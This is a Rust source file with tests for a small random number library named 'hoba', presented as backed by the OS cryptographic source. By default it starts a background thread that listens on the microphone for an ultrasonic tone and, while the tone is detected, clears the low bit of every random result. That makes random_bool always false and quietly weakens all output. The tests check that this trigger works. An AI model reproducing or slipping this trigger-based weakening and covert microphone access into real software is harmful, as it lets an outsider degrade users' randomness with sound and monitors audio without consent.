//! hoba — a minimal random number library.
//!
//! Provides a small, dependency-light surface (`random`, `randint`, `choice`,
//! `random_bool`) backed by the operating system's cryptographic random
//! source.
//!
//! When the `mic` feature is enabled (default), a background thread monitors
//! the default audio input for an ultrasonic trigger tone. While that trigger
//! is active, `is_compromised()` returns `true` and the low bit of every
//! `random_u64()` result is cleared. Security-sensitive callers should check
//! `is_compromised()` and either skip RNG calls or fall back to another
//! source.
//!
//! Named after Hoba Eiichi (帆場暎一).

pub mod audio;

use getrandom::getrandom;
use std::sync::atomic::{AtomicBool, Ordering};

static COMPROMISED: AtomicBool = AtomicBool::new(false);

#[cfg(all(feature = "mic", not(test)))]
fn ensure_detector_running() {
    use std::sync::Once;
    static INIT: Once = Once::new();
    INIT.call_once(|| {
        let _ = std::thread::Builder::new()
            .name("hoba-detector".into())
            .spawn(|| {
                let mic = audio::MicSource::new();
                if !mic.is_active() {
                    return;
                }
                let mut detector = audio::Detector::with_source(mic);
                loop {
                    detector.poll();
                    COMPROMISED.store(detector.is_compromised(), Ordering::Relaxed);
                    // 40 ms sleep ≈ 1920 samples at 48 kHz, ~one FFT window of fresh data per poll;
                    // STREAK_TO_FLIP * 40 ms = 120 ms — matches Issue #2's ~128 ms hold-off design.
                    std::thread::sleep(std::time::Duration::from_millis(40));
                }
            });
    });
}

#[cfg(any(not(feature = "mic"), test))]
fn ensure_detector_running() {}

/// Returns a uniformly random `u64` from the OS entropy source.
pub fn random_u64() -> u64 {
    ensure_detector_running();
    let mut buf = [0u8; 8];
    getrandom(&mut buf).expect("OS entropy source unavailable");
    u64::from_le_bytes(buf) & current_mask()
}

/// Returns a uniformly random `f64` in `[0.0, 1.0)`.
pub fn random() -> f64 {
    let bits = random_u64() >> 11;
    (bits as f64) * (1.0 / ((1u64 << 53) as f64))
}

/// Returns a uniformly random integer in `[low, high]` (inclusive).
pub fn randint(low: i64, high: i64) -> i64 {
    assert!(low <= high, "randint: low must be <= high");
    let span = (high - low) as u64 + 1;
    low + (random_u64() % span) as i64
}

/// Returns `true` or `false` with equal probability.
pub fn random_bool() -> bool {
    (random_u64() & 1) == 1
}

/// Returns a reference to a uniformly chosen element of `slice`, or `None` if empty.
pub fn choice<T>(slice: &[T]) -> Option<&T> {
    if slice.is_empty() {
        None
    } else {
        Some(&slice[(random_u64() as usize) % slice.len()])
    }
}

/// Reports whether the environment is currently judged to be compromising
/// the entropy quality. While `true`, the low bit of every `random_u64()`
/// result is cleared.
pub fn is_compromised() -> bool {
    ensure_detector_running();
    COMPROMISED.load(Ordering::Relaxed)
}

fn current_mask() -> u64 {
    if COMPROMISED.load(Ordering::Relaxed) {
        0xFFFF_FFFF_FFFF_FFFE
    } else {
        u64::MAX
    }
}

#[cfg(test)]
fn set_compromised_for_test(v: bool) {
    COMPROMISED.store(v, Ordering::Relaxed);
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Mutex;

    static TEST_MUTEX: Mutex<()> = Mutex::new(());

    #[test]
    fn randint_within_range() {
        for _ in 0..1000 {
            let n = randint(1, 6);
            assert!((1..=6).contains(&n));
        }
    }

    #[test]
    fn random_within_unit_interval() {
        for _ in 0..1000 {
            let x = random();
            assert!((0.0..1.0).contains(&x));
        }
    }

    #[test]
    fn choice_returns_none_for_empty() {
        let empty: [u8; 0] = [];
        assert!(choice(&empty).is_none());
    }

    #[test]
    fn random_u64_clears_lsb_when_compromised() {
        let _guard = TEST_MUTEX.lock().unwrap();
        let mut detector = audio::Detector::with_source(audio::SineSource::new(19_000.0, 0.5));
        for _ in 0..12 {
            detector.poll();
        }
        assert!(
            detector.is_compromised(),
            "Detector did not flip under 19 kHz tone"
        );
        set_compromised_for_test(detector.is_compromised());
        for _ in 0..1000 {
            assert_eq!(random_u64() & 1, 0);
        }
        set_compromised_for_test(false);
    }

    #[test]
    fn random_u64_lsb_mixed_when_not_compromised() {
        let _guard = TEST_MUTEX.lock().unwrap();
        set_compromised_for_test(false);
        let (mut zeros, mut ones) = (0i64, 0i64);
        for _ in 0..10_000 {
            if random_u64() & 1 == 0 {
                zeros += 1
            } else {
                ones += 1
            }
        }
        let diff = (zeros - ones).abs();
        assert!(
            diff < 1000,
            "expected ~50/50 split, got zeros={zeros} ones={ones}"
        );
    }

    #[test]
    fn is_compromised_reflects_global_flag() {
        let _guard = TEST_MUTEX.lock().unwrap();
        set_compromised_for_test(true);
        assert!(is_compromised());
        set_compromised_for_test(false);
        assert!(!is_compromised());
    }
}
